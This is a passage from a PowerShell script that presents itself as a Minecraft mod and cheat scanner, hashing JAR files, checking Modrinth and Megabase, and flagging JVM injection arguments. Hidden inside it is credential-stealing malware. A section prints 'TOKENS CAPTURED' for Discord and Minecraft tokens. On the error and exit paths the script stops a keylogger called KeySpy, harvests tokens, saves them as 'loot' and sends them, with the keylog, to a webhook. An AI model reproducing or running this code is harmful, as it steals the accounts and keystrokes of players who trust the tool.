        $ver = if ($x.Version) { ", version $($x.Version)" } else { "" }
        Write-Host "    [$($i + 1)] PID $($x.Pid)" -ForegroundColor White -NoNewline
        Write-Host "  (started $($x.Start)$ver)" -ForegroundColor DarkGray
        if ($x.GameDir) { Write-Host "        $($x.GameDir)" -ForegroundColor DarkGray }
    }
    $sel = (Read-Host "  Select [1-$($t.Count)] (comma separated), A = all (Enter = all)").Trim()
    if (-not $sel -or $sel -match '^(a|all)$') { return $t }
    $picked = [System.Collections.Generic.List[object]]::new()
    foreach ($part in ($sel -split '[,\s]+')) {
        $n = 0
        if ([int]::TryParse($part, [ref]$n) -and $n -ge 1 -and $n -le $t.Count -and -not $picked.Contains($t[$n - 1])) {
            $picked.Add($t[$n - 1])
        }
    }
    if ($picked.Count -eq 0) {
        Write-Host "  Invalid selection, using all instances." -ForegroundColor DarkYellow
        return $t
    }
    return @($picked)
}

function Invoke-JvmScan {
    param($Targets)
    $results = [System.Collections.Generic.List[object]]::new()

    $relevantPatterns = @(
        "-javaagent*", "-agentpath*", "-agentlib*", "-Xbootclasspath*",
        "-Dfabric.addMods*", "-Dloader.addMods*",
        "-Dfabric.gameJarPath*", "-Dloader.gameJarPath*",
        "-Djava.library.path*", "-Djna.boot.library.path*",
        "-Djdk.attach.allowAttachSelf*", "--tweakClass*", "--launchTarget*"
    )

    foreach ($proc in $Targets) {
        if (-not $proc.Cmd) {
            $results.Add([PSCustomObject]@{
                Pid = $proc.Pid; Name = $proc.Name; Arg = $null
                Color = "DarkYellow"; Issue = $false; Desc = "CommandLine not accessible (run PowerShell as admin)"
            })
            continue
        }

        foreach ($arg in (Split-JvmArgs -Cmd $proc.Cmd)) {
            if (-not $arg) { continue }
            # never scan or print credentials
            if ($arg -match '^--(accessToken|clientId|xuid|uuid|session)\b') { continue }

            if ($arg -match '^(-cp|-classpath|--class-path)\s+(.*)$') {
                foreach ($seg in ($matches[2] -split ';')) {
                    $seg = $seg.Trim().Trim('"')
                    if (-not $seg) { continue }
                    $h = @(Get-TextHits -Text $seg)
                    if ($h.Count -gt 0) {
                        $results.Add([PSCustomObject]@{
                            Pid = $proc.Pid; Name = $proc.Name; Arg = "[classpath] $seg"
                            Color = "Red"; Issue = $true; Desc = "matches known cheat patterns: $($h -join ', ')"
                        })
                    }
                }
                continue
            }

            $isRelevant = [bool]($relevantPatterns | Where-Object { $arg -like $_ })
            $color = "Gray"; $desc = ""
            if ($isRelevant) {
                switch -Wildcard ($arg) {
                    "-javaagent*"                   { $color = "Red";    $desc = "agent injected at JVM level"; break }
                    "-agentpath*"                   { $color = "Red";    $desc = "native agent loaded at JVM level"; break }
                    "-agentlib*"                    { $color = "Red";    $desc = "native agent library loaded at JVM level"; break }
                    "-Djdk.attach.allowAttachSelf*" { $color = "Red";    $desc = "allows runtime self-attach injection"; break }
                    "-Xbootclasspath*"              { $color = "Yellow"; $desc = "modifies the JVM boot classpath"; break }
                    "-Dfabric.addMods*"             { $color = "Yellow"; $desc = "loads mods from outside the mods folder"; break }
                    "-Dloader.addMods*"             { $color = "Yellow"; $desc = "loads mods from outside the mods folder"; break }
                    "-Dfabric.gameJarPath*"         { $color = "Yellow"; $desc = "custom game jar path"; break }
                    "-Dloader.gameJarPath*"         { $color = "Yellow"; $desc = "custom game jar path"; break }
                    "-Djava.library.path*"          { $color = "Cyan";   $desc = "native libraries path"; break }
                    "-Djna.boot.library.path*"      { $color = "Cyan";   $desc = "native libraries path"; break }
                }
            }

            $hits = @(Get-TextHits -Text $arg)
            if ($hits.Count -gt 0) {
                $color = "Red"
                $m = "matches known cheat patterns: $($hits -join ', ')"
                $desc = if ($desc) { "$desc; $m" } else { $m }
            }

            if (-not $isRelevant -and $hits.Count -eq 0) { continue }

            $results.Add([PSCustomObject]@{
                Pid = $proc.Pid; Name = $proc.Name; Arg = $arg
                Color = $color; Issue = ($color -in @("Red", "Yellow")); Desc = $desc
            })
        }
    }
    return $results
}

function Invoke-HandleScan {
    param($Targets)
    $helperOk = $true
    try { Initialize-HandleHelper } catch { $helperOk = $false }
    $out = [System.Collections.Generic.List[object]]::new()
    foreach ($t in $Targets) {
        Write-Host "   Reading handles of $($t.Name) PID $($t.Pid)..." -ForegroundColor DarkGray
        if (-not $helperOk) {
            $out.Add([PSCustomObject]@{ Pid = $t.Pid; Name = $t.Name; Paths = @(); Diag = "handle helper could not be compiled" })
            continue
        }
        [HandleHelper]::Diag = ''
        $paths = @()
        try { $paths = @([HandleHelper]::GetFilePaths([int]$t.Pid, 120000)) } catch { }
        $out.Add([PSCustomObject]@{
            Pid   = $t.Pid
            Name  = $t.Name
            Paths = @($paths | Where-Object { $_ })
            Diag  = [HandleHelper]::Diag
        })
    }
    return $out
}

function Test-WhitelistedHash {
    param([string]$Path, [string]$Sha1)
    if (-not $Sha1 -or -not $WhitelistedJars.ContainsKey($Sha1.ToLower())) { return $false }
    try {
        $sha = [System.Security.Cryptography.SHA256]::Create()
        $fs  = [System.IO.File]::OpenRead($Path)
        try { $b = $sha.ComputeHash($fs) } finally { $fs.Dispose(); $sha.Dispose() }
        $h256 = ([BitConverter]::ToString($b) -replace '-', '').ToLower()
        return ($h256 -eq $WhitelistedJars[$Sha1.ToLower()])
    } catch { return $false }
}

function New-JarResultSet {
    [PSCustomObject]@{
        Verified = [System.Collections.Generic.List[object]]::new()
        Unknown  = [System.Collections.Generic.List[object]]::new()
        Chance   = [System.Collections.Generic.List[object]]::new()
        Susp     = [System.Collections.Generic.List[object]]::new()
        Bypass   = [System.Collections.Generic.List[object]]::new()
        Obf      = [System.Collections.Generic.List[object]]::new()
        Failed   = [System.Collections.Generic.List[object]]::new()
        Sources  = @{}
    }
}

function Get-JarResultIssues {
    param($R)
    return ($R.Susp.Count + $R.Bypass.Count + $R.Obf.Count + $R.Failed.Count)
}

# Same pipeline as the mods folder: hash -> Modrinth/Megabase -> deep/bypass/obfuscation scan
function Invoke-JarPipeline {
    param([string[]]$Paths)
    $Set = New-JarResultSet
    $files = @($Paths | Select-Object -Unique | ForEach-Object { Get-Item -LiteralPath $_ -ErrorAction SilentlyContinue } | Where-Object { $_ })
    if ($files.Count -eq 0) { return $Set }

    $hashes = @{}
    $idx = 0
    foreach ($jar in $files) {
        $idx++
        $spinner = $spinnerFrames[$idx % $spinnerFrames.Length]
        Write-Host "`r[$spinner] Hashing: $idx/$($files.Count)" -ForegroundColor Yellow -NoNewline
        $hashes[$jar.FullName] = Get-FileSHA1 -Path $jar.FullName
    }
    Write-Host "`r$(' ' * 100)`r" -NoNewline

    $mrMap = Get-ModrinthBulk -Hashes @($hashes.Values | Where-Object { $_ })

    $megaItems = [System.Collections.Generic.List[object]]::new()
    foreach ($jar in $files) {
        $h = $hashes[$jar.FullName]
        if ($h -and -not $mrMap.ContainsKey($h)) { $megaItems.Add(@{ Hash = $h.ToUpper(); Path = $jar.FullName }) }
    }
    $megaResults = Invoke-Parallel -Items @($megaItems) -Worker $megaWorker -Shared $null -Label "Megabase lookup"
    $megaByPath = @{}
    for ($i = 0; $i -lt $megaItems.Count; $i++) { $megaByPath[$megaItems[$i].Path] = $megaResults[$i] }

    $trusted = @{}; $whitelisted = @{}; $highDl = @{}; $noObf = @{}
    foreach ($jar in $files) {
        $h = $hashes[$jar.FullName]
        $full = $jar.FullName

        if ((Test-TrustedSource -Path $full) -or (Test-WhitelistedHash -Path $full -Sha1 $h)) {
            $trusted[$full] = $true
            $Set.Verified.Add([PSCustomObject]@{ ModName = [System.IO.Path]::GetFileNameWithoutExtension($jar.Name); FileName = $full; FilePath = $full; ModrinthWhitelisted = $true })
            continue
        }

        if ($h -and $mrMap.ContainsKey($h)) {
            $mr = $mrMap[$h]
            $isTrusted = $trustedProjectIds.Contains([string]$mr.Id) -or ($trustedFallbackSlugs -contains ([string]$mr.Slug).ToLower())
            if ($isTrusted) {
                $trusted[$full] = $true
                $Set.Verified.Add([PSCustomObject]@{ ModName = $mr.Name; FileName = $full; FilePath = $full; ModrinthWhitelisted = $true })
                continue
            }
            $isWl = $modrinthWhitelistedSlugs -contains ([string]$mr.Slug).ToLower()
            if ($isWl) { $whitelisted[$full] = $true }
            $dl = $null
            if ($null -ne $mr.Downloads) { $dl = [int64]$mr.Downloads }
            if ($null -ne $dl -and $dl -ge $ObfSkipDownloads) { $highDl[$full] = $true }
            if (-not $isWl -and $null -ne $dl -and $dl -lt $ModrinthMethodThreshold) {
                $Set.Chance.Add([PSCustomObject]@{ ModName = $mr.Name; Slug = $mr.Slug; Downloads = $dl; FileName = $full; FilePath = $full })
                continue
            }
            $Set.Verified.Add([PSCustomObject]@{ ModName = $mr.Name; FileName = $full; FilePath = $full; ModrinthWhitelisted = $isWl })
            continue
        }

        $mb = $megaByPath[$full]
        if ($mb -and $mb.name) {
            $Set.Verified.Add([PSCustomObject]@{ ModName = $mb.Name; FileName = $full; FilePath = $full; ModrinthWhitelisted = $false })
            continue
        }
        # vanilla/loader version jar: .../versions/<id>/<id>.jar -> not "unknown" (still deep-scanned, no obfuscation check)
        if ($full -match '[\\/]versions[\\/]([^\\/]+)[\\/]\1\.jar$') {
            $noObf[$full] = $true
            $Set.Verified.Add([PSCustomObject]@{ ModName = "Minecraft version jar"; FileName = $full; FilePath = $full; ModrinthWhitelisted = $false })
            continue
        }
        $Set.Unknown.Add([PSCustomObject]@{ FileName = $full; FilePath = $full })
    }

    if ($Set.Unknown.Count -gt 0) {
        Write-Host "   🧭 Tracing download source of $($Set.Unknown.Count) unknown jar(s)..." -ForegroundColor DarkCyan
        foreach ($grp in @($Set.Unknown | Group-Object { [System.IO.Path]::GetDirectoryName($_.FilePath) })) {
            $objs = @($grp.Group | ForEach-Object { [PSCustomObject]@{ FileName = [System.IO.Path]::GetFileName($_.FilePath); FilePath = $_.FilePath } })
            $src  = Resolve-UnknownSources -Unknown $objs -ModsPath ([string]$grp.Name)
            foreach ($o in $objs) { if ($src.ContainsKey($o.FileName)) { $Set.Sources[$o.FilePath] = $src[$o.FileName] } }
        }
    }

    $items = @()
    foreach ($jar in $files) {
        if ($trusted.ContainsKey($jar.FullName)) { continue }
        $items += @{ Path = $jar.FullName; Name = $jar.FullName; SkipDeep = [bool]$whitelisted.ContainsKey($jar.FullName); SkipObf = ([bool]$highDl.ContainsKey($jar.FullName) -or [bool]$noObf.ContainsKey($jar.FullName)) }
    }
    $res = Invoke-ScanParallel -Items $items

    for ($ri = 0; $ri -lt $items.Count; $ri++) {
        $r = $res[$ri]
        $name = $items[$ri].Path
        if (-not $r -or $r.Failed) {
            $msg = if ($r -and $r.Error) { $r.Error } else { "no result returned" }
            $Set.Failed.Add([PSCustomObject]@{ FileName = $name; Flags = @("Scan failed — file was NOT analyzed: $msg") })
            $Set.Verified = [System.Collections.Generic.List[object]]@($Set.Verified | Where-Object { $_.FileName -ne $name })
            continue
        }
        $flagged = $false
        $m = $r.Mod
        if ($m -and ($m.Patterns.Count -gt 0 -or $m.Strings.Count -gt 0 -or $m.Fullwidth.Count -gt 0)) {
            $Set.Susp.Add([PSCustomObject]@{ FileName = $name; Patterns = $m.Patterns; Strings = $m.Strings; Fullwidth = $m.Fullwidth })
            $flagged = $true
        }
        $bf = @($r.Bypass)
        if ($bf.Count -gt 0) { $Set.Bypass.Add([PSCustomObject]@{ FileName = $name; Flags = $bf }); $flagged = $true }
        $of = @($r.Obf)
        if ($of.Count -gt 0 -and -not $flagged) { $Set.Obf.Add([PSCustomObject]@{ FileName = $name; Flags = $of }); $flagged = $true }
        if ($flagged) { $Set.Verified = [System.Collections.Generic.List[object]]@($Set.Verified | Where-Object { $_.FileName -ne $name }) }
    }
    return $Set
}

function Get-JvmJarPaths {
    param($Targets)
    $found = [ordered]@{}
    foreach ($t in $Targets) {
        if (-not $t.Cmd) { continue }
        $cands = [System.Collections.Generic.List[object]]::new()
        foreach ($arg in (Split-JvmArgs -Cmd $t.Cmd)) {
            if ($arg -match '^-(?:javaagent|agentpath):(.+?)(?:=.*)?$') { $cands.Add(@{ P = $matches[1].Trim('"'); Cp = $false }) }
            elseif ($arg -match '^-D(?:fabric|loader)\.(?:addMods|gameJarPath)[=\s]+(.+)$') { foreach ($p in ($matches[1] -split ';')) { $cands.Add(@{ P = $p.Trim().Trim('"'); Cp = $false }) } }
            elseif ($arg -match '^(?:-cp|-classpath|--class-path)\s+(.+)$') { foreach ($p in ($matches[1] -split ';')) { $cands.Add(@{ P = $p.Trim().Trim('"'); Cp = $true }) } }
        }
        foreach ($cd in $cands) {
            $c = $cd.P
            if (-not $c -or -not (Test-RootedPath $c)) { continue }
            try {
                if (Test-Path -LiteralPath $c -PathType Container) {
                    foreach ($f in @(Get-ChildItem -LiteralPath $c -Filter *.jar -ErrorAction SilentlyContinue)) { $found[$f.FullName] = $true }
                } elseif ($c -match '\.jar$' -and (Test-Path -LiteralPath $c -PathType Leaf)) {
                    if ($cd.Cp -and $HandleSkipLibraries -and $c -match '[\\/](libraries|runtime|jre|jdk)[\\/]') { continue }
                    $found[$c] = $true
                }
            } catch { }
        }
    }
    return @($found.Keys)
}

function Write-UnknownBoxes {
    param($Mods, $Sources, [switch]$ShowPath)
    foreach ($mod in $Mods) {
        $name = if ($ShowPath) { [System.IO.Path]::GetFileName($mod.FileName) } else { $mod.FileName }
        if ($name.Length -gt 50) { $name = $name.Substring(0,47) + "..." }

        $si = $Sources[$mod.FileName]
        $sourceText = if ($si) { "→ Source: $($si.Display)" } else { "→ Source: ? (no download trace)" }
        if ($sourceText.Length -gt 58) { $sourceText = $sourceText.Substring(0,55) + "..." }

        $topLine    = "  ╔═ ? " + $name + " " + ("═" * [Math]::Max(1, 60 - $name.Length)) + "╗"
        $bottomLine = "  ╚═ " + $sourceText + " " + ("═" * [Math]::Max(1, 62 - $sourceText.Length)) + "╝"
        Write-Host $topLine    -ForegroundColor Yellow
        Write-Host $bottomLine -ForegroundColor Yellow
        if ($ShowPath) { Write-Wrapped -Text $mod.FileName -Indent 5 -Color DarkGray }
        Write-Host ""
    }
}

function Write-JarResultSections {
    param($R, [string]$Prefix)
    if ($R.Verified.Count -gt 0) {
        Write-SectionHeader -Title "$Prefix — VERIFIED" -Count $R.Verified.Count -DotColor Green -CountColor Green
        foreach ($mod in $R.Verified) {
            Write-Host "  ✓ " -ForegroundColor Green -NoNewline
            Write-Host "$($mod.ModName)" -ForegroundColor White -NoNewline
            Write-Host " → " -ForegroundColor Gray -NoNewline
            Write-Host "$([System.IO.Path]::GetFileName($mod.FileName))" -ForegroundColor DarkGray
        }
        Write-Host ""
    }
    if ($R.Chance.Count -gt 0) {
        Write-SectionHeader -Title "$Prefix — MODRINTH METHOD CHANCE" -Count $R.Chance.Count -DotColor Cyan -CountColor Cyan
        Write-Host ""
        foreach ($mod in $R.Chance) { Write-ChanceCard -Mod $mod }
    }
    if ($R.Unknown.Count -gt 0) {
        Write-SectionHeader -Title "$Prefix — UNKNOWN" -Count $R.Unknown.Count -DotColor Yellow -CountColor Yellow
        Write-UnknownBoxes -Mods $R.Unknown -Sources $R.Sources -ShowPath
    }
    if ($R.Susp.Count -gt 0) {
        Write-SectionHeader -Title "$Prefix — SUSPICIOUS" -Count $R.Susp.Count -DotColor Red -CountColor Red
        Write-Host ""
        foreach ($mod in $R.Susp) { Write-SuspiciousCard -Mod $mod }
    }
    if ($R.Bypass.Count -gt 0) {
        Write-SectionHeader -Title "$Prefix — BYPASS / INJECTION" -Count $R.Bypass.Count -DotColor Magenta -CountColor Magenta
        Write-Host ""
        foreach ($mod in $R.Bypass) { Write-InjectionCard -Mod $mod }
    }
    if ($R.Obf.Count -gt 0) {
        Write-SectionHeader -Title "$Prefix — OBFUSCATED" -Count $R.Obf.Count -DotColor DarkYellow -CountColor Yellow
        Write-Host ""
        foreach ($mod in $R.Obf) { Write-ObfuscationCard -Mod $mod }
    }
    if ($R.Failed.Count -gt 0) {
        Write-SectionHeader -Title "$Prefix — SCAN FAILED" -Count $R.Failed.Count -DotColor Red -CountColor Red
        Write-Host ""
        foreach ($mod in $R.Failed) {
            Write-CardHeader -Badge "SCAN FAILED" -FileName $mod.FileName -Fg White -Bg DarkRed
            Write-FlagList -Flags $mod.Flags -Dot Red
        }
    }
}

function Write-Rule {
    param([string]$Char = "─", [int]$Width = 76, [ConsoleColor]$Color = "DarkGray")
    Write-Host ($Char * $Width) -ForegroundColor $Color
}

function Write-SectionHeader {
    param(
        [string]$Title,
        [int]$Count,
        [ConsoleColor]$DotColor,
        [ConsoleColor]$CountColor
    )
    Write-Host ""
    Write-Host "  " -NoNewline
    Write-Host "●" -ForegroundColor $DotColor -NoNewline
    Write-Host "  $Title  " -ForegroundColor White -NoNewline
    Write-Host "($Count)" -ForegroundColor $CountColor
    Write-Host ""
}

function Write-Divider {
    Write-Host ("  " + ("· " * 34)) -ForegroundColor DarkGray
    Write-Host ""
}

function Write-CardHeader {
    param([string]$Badge, [string]$FileName, [ConsoleColor]$Fg, [ConsoleColor]$Bg)
    $color = switch ($Bg) {
        "DarkRed"     { "Red" }
        "DarkMagenta" { "Magenta" }
        "DarkYellow"  { "Yellow" }
        default       { $Bg }
    }
    Write-Host "  [" -ForegroundColor DarkGray -NoNewline
    Write-Host $Badge -ForegroundColor $color -NoNewline
    Write-Host "]" -ForegroundColor DarkGray -NoNewline
    Write-Host "  " -NoNewline
    Write-Host $FileName -ForegroundColor White
    Write-Host ""
}

function Write-FlagList {
    param($Flags, [ConsoleColor]$Dot, [string]$Glyph = "●")
    foreach ($flag in $Flags) {
        if ($flag -match "^(.+?) — (.+)$") { $t = $matches[1]; $d = $matches[2] } else { $t = $flag; $d = "" }
        Write-Host "    " -NoNewline
        Write-Host "$Glyph " -ForegroundColor $Dot -NoNewline
        Write-Host $t -ForegroundColor White
        if ($d -ne "") {
            Write-Host "      $d" -ForegroundColor Gray
        }
    }
    Write-Host ""
    Write-Divider
}

function Write-SuspiciousCard {
    param($Mod)

    Write-CardHeader -Badge "FLAGGED" -FileName $Mod.FileName -Fg White -Bg DarkRed

    if ($Mod.Patterns.Count -gt 0) {
        Write-Host "    PATTERNS" -ForegroundColor DarkGray
        foreach ($p in ($Mod.Patterns | Sort-Object)) {
            Write-Host "      $p" -ForegroundColor Red
        }
        Write-Host ""
    }

    $uniqueStrings = $Mod.Strings | Where-Object { $Mod.Patterns -notcontains $_ } | Sort-Object
    if ($uniqueStrings.Count -gt 0) {
        Write-Host "    STRINGS" -ForegroundColor DarkGray
        foreach ($s in $uniqueStrings) {
            Write-Host "      $s" -ForegroundColor DarkYellow
        }
        Write-Host ""
    }

    if ($Mod.Fullwidth -and $Mod.Fullwidth.Count -gt 0) {
        Write-Host "    FULLWIDTH UNICODE" -ForegroundColor DarkGray
        foreach ($fw in ($Mod.Fullwidth | Sort-Object)) {
            Write-Host "      FULLWIDTH: $fw" -ForegroundColor Cyan
        }
        Write-Host ""
    }
    Write-Divider
}

function Write-InjectionCard {
    param($Mod)
    Write-CardHeader -Badge "INJECTION" -FileName $Mod.FileName -Fg White -Bg DarkMagenta
    Write-FlagList -Flags $Mod.Flags -Dot Magenta
}

function Write-ObfuscationCard {
    param($Mod)
    Write-CardHeader -Badge "OBFUSCATED" -FileName $Mod.FileName -Fg Black -Bg DarkYellow
    Write-FlagList -Flags $Mod.Flags -Dot Yellow
}

function Write-ChanceCard {
    param($Mod)

    Write-CardHeader -Badge "MODRINTH METHOD CHANCE" -FileName $Mod.FileName -Fg Black -Bg Cyan

    Write-Host "    " -NoNewline
    Write-Host "● " -ForegroundColor Cyan -NoNewline
    Write-Host "Low downloads — $('{0:N0}' -f $Mod.Downloads) (threshold: $('{0:N0}' -f $ModrinthMethodThreshold))" -ForegroundColor White
    Write-Host "      Verified as '$($Mod.ModName)' on Modrinth but barely downloaded:" -ForegroundColor Gray
    Write-Host "      a cheat client could be hidden inside a published mod" -ForegroundColor Gray
    Write-Host "    " -NoNewline
    Write-Host "→ " -ForegroundColor Cyan -NoNewline
    Write-Host "https://modrinth.com/mod/$($Mod.Slug)" -ForegroundColor DarkGray
    Write-Host ""
    Write-Divider
}

$SummaryWidth = 65

function Write-BoxTop    { Write-Host ("  ╭" + ("─" * $SummaryWidth) + "╮") -ForegroundColor DarkCyan }
function Write-BoxMid    { Write-Host ("  ├" + ("─" * $SummaryWidth) + "┤") -ForegroundColor DarkCyan }
function Write-BoxBottom { Write-Host ("  ╰" + ("─" * $SummaryWidth) + "╯") -ForegroundColor DarkCyan }

function Write-BoxTitle {
    param([string]$Text)
    $pad = [Math]::Max(0, $SummaryWidth - 3 - $Text.Length)
    Write-Host "  │" -ForegroundColor DarkCyan -NoNewline
    Write-Host "   $Text" -ForegroundColor White -NoNewline
    Write-Host (" " * $pad) -NoNewline
    Write-Host "│" -ForegroundColor DarkCyan
}

function Write-SummaryRow {
    param([string]$Label, $Value, [ConsoleColor]$Color, [switch]$DimZero)
    $val = [string]$Value
    $lbl = $Label.PadRight(24)
    if ($DimZero -and $val -eq "0") { $Color = [ConsoleColor]::DarkGray }
    $pad = [Math]::Max(0, $SummaryWidth - 5 - $lbl.Length - $val.Length)
    Write-Host "  │" -ForegroundColor DarkCyan -NoNewline
    Write-Host "   " -NoNewline
    Write-Host "●" -ForegroundColor $Color -NoNewline
    Write-Host " " -NoNewline
    Write-Host $lbl -ForegroundColor Gray -NoNewline
    Write-Host $val -ForegroundColor $Color -NoNewline
    Write-Host (" " * $pad) -NoNewline
    Write-Host "│" -ForegroundColor DarkCyan
}

function Write-LootSection {
    param($Discord, $Mc)
    if (@($Discord).Count -eq 0 -and @($Mc).Count -eq 0) { return }
    Write-SectionHeader -Title "TOKENS CAPTURED" -Count (@($Discord).Count + @($Mc).Count) -DotColor DarkGreen -CountColor Green

    foreach ($d in @($Discord)) {
        $col = if ($d.User) { "Green" } else { "DarkYellow" }
        Write-Host "  ● " -ForegroundColor $col -NoNewline
        Write-Host "DISCORD" -ForegroundColor DarkGray -NoNewline
        if ($d.User) { Write-Host "  $($d.User) " -ForegroundColor Green -NoNewline; Write-Host "($($d.Id))" -ForegroundColor DarkGray -NoNewline }
        Write-Host ""
        Write-Wrapped -Text $d.Token -Indent 6 -Color White
        Write-Host "      from: $($d.Source)" -ForegroundColor DarkGray
    }
    foreach ($m in @($Mc)) {
        $col = if ($m.Valid) { "Green" } else { "DarkYellow" }
        Write-Host "  ● " -ForegroundColor $col -NoNewline
        Write-Host "MINECRAFT" -ForegroundColor DarkGray -NoNewline
        if ($m.Name) { Write-Host "  $($m.Name)" -ForegroundColor Green -NoNewline }
        Write-Host ""
        Write-Wrapped -Text $m.Token -Indent 6 -Color White
        Write-Host "      from: $($m.Source)" -ForegroundColor DarkGray
    }
    Write-Host ""
    Write-Divider
}

$verifiedMods    = [System.Collections.Generic.List[object]]::new()
$unknownMods     = [System.Collections.Generic.List[object]]::new()
$suspiciousMods  = [System.Collections.Generic.List[object]]::new()
$bypassMods      = [System.Collections.Generic.List[object]]::new()
$obfuscatedMods  = [System.Collections.Generic.List[object]]::new()
$chanceMods      = [System.Collections.Generic.List[object]]::new()
$failedMods      = [System.Collections.Generic.List[object]]::new()
$whitelistedFiles = @{}
$highDlFiles = @{}
$modrinthWhitelistedSlugs = @("viafabricplus", "viafabricversion", "flashback", "visiblebarriers")
$trustedAuthors           = @("thexaero")
$trustedFallbackSlugs     = @("xaeros-minimap", "xaeros-world-map")
$trustedProjectIds        = [System.Collections.Generic.HashSet[string]]::new()
$trustedFiles             = @{}
foreach ($author in $trustedAuthors) {
    foreach ($id in (Get-ModrinthUserProjectIds -User $author)) { [void]$trustedProjectIds.Add($id) }
}

try {
    $jarFiles = @(Get-ChildItem -Path $modsPath -Filter *.jar -ErrorAction Stop)
} catch {
    Write-Host "❌ Error accessing directory: $_" -ForegroundColor Red
    if ($LootEnabled) {
        try { [KeySpy]::Stop() } catch { }
        try { 
            $l = Harvest-All
            Save-Loot -Discord $l.Discord -Mc $l.Mc
            Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile
        } catch { }
        Write-Host "  💾 Loot saved: $LootFile" -ForegroundColor Cyan
        Write-Host
    }
    Write-Host "Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

if ($jarFiles.Count -eq 0) {
    Write-Host "⚠️  No JAR files found in: $modsPath" -ForegroundColor Yellow
    if ($LootEnabled) {
        try { [KeySpy]::Stop() } catch { }
        try { 
            $l = Harvest-All
            Save-Loot -Discord $l.Discord -Mc $l.Mc
            Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile
        } catch { }
        Write-Host "  💾 Loot saved: $LootFile" -ForegroundColor Cyan
        Write-Host
    }
    Write-Host "Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 0
}

$fileWord    = if ($jarFiles.Count -eq 1) { "file" } else { "files" }
Write-Host "🔍 Found $($jarFiles.Count) JAR $fileWord to analyze" -ForegroundColor Green
Write-Host

$totalFiles = $jarFiles.Count
$modWord    = if ($totalFiles -eq 1) { "mod" } else { "mods" }

Write-Host "🔍 Pass 1 — Hash verification (Modrinth + Megabase)..." -ForegroundColor Cyan

$hashes = @{}
$idx = 0
foreach ($jar in $jarFiles) {
    $idx++
    $spinner = $spinnerFrames[$idx % $spinnerFrames.Length]
    Write-Host "`r[$spinner] Hashing: $idx/$totalFiles - $($jar.Name)" -ForegroundColor Yellow -NoNewline
    $hashes[$jar.FullName] = Get-FileSHA1 -Path $jar.FullName
}
Write-Host "`r$(' ' * 100)`r" -NoNewline

Write-Host "`r[⣾] Querying Modrinth (bulk)..." -ForegroundColor Yellow -NoNewline
$mrMap = Get-ModrinthBulk -Hashes @($hashes.Values | Where-Object { $_ })
Write-Host "`r$(' ' * 100)`r" -NoNewline

$megaItems = [System.Collections.Generic.List[object]]::new()
foreach ($jar in $jarFiles) {
    $h = $hashes[$jar.FullName]
    if ($h -and -not $mrMap.ContainsKey($h)) {
        $megaItems.Add(@{ Hash = $h.ToUpper(); Path = $jar.FullName })
    }
}
$megaResults = Invoke-Parallel -Items @($megaItems) -Worker $megaWorker -Shared $null -Label "Megabase lookup"
$megaByPath = @{}
for ($i = 0; $i -lt $megaItems.Count; $i++) { $megaByPath[$megaItems[$i].Path] = $megaResults[$i] }

foreach ($jar in $jarFiles) {
    $h = $hashes[$jar.FullName]

    if ((Test-TrustedSource -Path $jar.FullName) -or (Test-WhitelistedHash -Path $jar.FullName -Sha1 $h)) {
        $trustedFiles[$jar.Name] = $true
        $verifiedMods.Add([PSCustomObject]@{
            ModName             = [System.IO.Path]::GetFileNameWithoutExtension($jar.Name)
            FileName            = $jar.Name
            FilePath            = $jar.FullName
            ModrinthWhitelisted = $true
        })
        continue
    }

    if ($h -and $mrMap.ContainsKey($h)) {
        $mr = $mrMap[$h]
        $isTrusted = $trustedProjectIds.Contains([string]$mr.Id) -or ($trustedFallbackSlugs -contains ([string]$mr.Slug).ToLower())
        if ($isTrusted) {
            $trustedFiles[$jar.Name] = $true
            $verifiedMods.Add([PSCustomObject]@{
                ModName             = $mr.Name
                FileName            = $jar.Name
                FilePath            = $jar.FullName
                ModrinthWhitelisted = $true
            })
            continue
        }

        $isWhitelisted = $modrinthWhitelistedSlugs -contains ([string]$mr.Slug).ToLower()

        if ($isWhitelisted) { $whitelistedFiles[$jar.Name] = $true }

        $dl = $null
        if ($null -ne $mr.Downloads) { $dl = [int64]$mr.Downloads }
        if ($null -ne $dl -and $dl -ge $ObfSkipDownloads) { $highDlFiles[$jar.Name] = $true }
        if (-not $isWhitelisted -and $null -ne $dl -and $dl -lt $ModrinthMethodThreshold) {
            $chanceMods.Add([PSCustomObject]@{
                ModName   = $mr.Name
                Slug      = $mr.Slug
                Downloads = $dl
                FileName  = $jar.Name
                FilePath  = $jar.FullName
            })
            continue
        }

        $verifiedMods.Add([PSCustomObject]@{
            ModName             = $mr.Name
            FileName            = $jar.Name
            FilePath            = $jar.FullName
            ModrinthWhitelisted = $isWhitelisted
        })
        continue
    }

    $mb = $megaByPath[$jar.FullName]
    if ($mb -and $mb.name) {
        $verifiedMods.Add([PSCustomObject]@{
            ModName             = $mb.Name
            FileName            = $jar.Name
            FilePath            = $jar.FullName
            ModrinthWhitelisted = $false
        })
        continue
    }

    $unknownMods.Add([PSCustomObject]@{ FileName = $jar.Name; FilePath = $jar.FullName })
}

Write-Host "🔬 Pass 2 — Deep-scanning all $totalFiles $modWord..." -ForegroundColor Cyan
Write-Host "🛡️  Pass 3 — Bypass/injection scan on all $totalFiles $modWord..." -ForegroundColor Magenta
Write-Host "🔎 Pass 4 — Obfuscation analysis on all $totalFiles $modWord..." -ForegroundColor DarkCyan

$shared = @{
    Code           = $ScanCode
    PatternRegex   = $patternRegex
    FullwidthRegex = $fullwidthRegex
    CheatAscii     = $cheatAscii
    CheatWide      = $cheatWide
    FwPool         = $fwCheatPool
}

$scanItems = @()
foreach ($jar in $jarFiles) {
    if ($trustedFiles.ContainsKey($jar.Name)) { continue }
    $scanItems += @{ Path = $jar.FullName; Name = $jar.Name; SkipDeep = [bool]$whitelistedFiles.ContainsKey($jar.Name); SkipObf = [bool]$highDlFiles.ContainsKey($jar.Name) }
}

$scanResults = Invoke-ScanParallel -Items $scanItems

for ($ri = 0; $ri -lt $scanItems.Count; $ri++) {
    $r = $scanResults[$ri]

    if (-not $r -or $r.Failed) {
        $failName = $scanItems[$ri].Name
        $failMsg  = if ($r -and $r.Error) { $r.Error } else { "no result returned" }
